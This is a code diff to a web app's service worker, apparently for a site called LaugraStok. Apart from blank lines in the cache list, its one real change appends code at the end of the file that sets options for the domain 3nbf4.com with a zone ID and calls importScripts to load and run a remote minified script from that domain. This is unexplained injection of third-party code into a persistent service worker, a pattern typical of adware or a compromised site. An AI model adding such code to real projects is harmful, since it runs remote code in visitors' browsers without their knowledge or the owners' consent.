@@ -11,7 +11,9 @@ const APP_SHELL = [
   './',
   './index.html',
   './style.css',
+
   './script.js',
+
   './actus.js',
   './sw-register.js',
   './manifest.json',
@@ -178,3 +180,9 @@ self.addEventListener('message', (event) => {
 });
 
 console.log('%c⚙️ Service Worker LaugraStok chargé', 'color:#10a37f;font-weight:bold');
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11927655
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
